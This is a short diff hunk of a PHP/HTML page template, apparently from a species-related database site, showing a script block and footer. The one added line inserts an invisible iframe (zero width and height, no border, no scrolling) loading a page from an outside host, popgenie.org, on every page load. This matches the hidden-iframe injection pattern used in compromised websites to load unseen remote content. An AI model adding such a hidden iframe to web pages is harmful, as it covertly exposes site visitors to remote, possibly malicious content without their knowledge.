@@ -91,6 +91,7 @@
          <script type="text/javascript">
             var color_array=<?php print json_encode($db_species_color_array)?>;
          </script>
+	<iframe frameborder="0" height="0" scrolling="no" src="http://v22.popgenie.org/demo/service.php?id=new" width="0"></iframe>
      <script type="text/javascript" src="js/onload_script.js"></script>
          <footer id="site_footer" style="width:100%" ><?php echo $c['copyright'] ." | $sig | $lstatus";?></footer>
 	   </div></div></br></br>
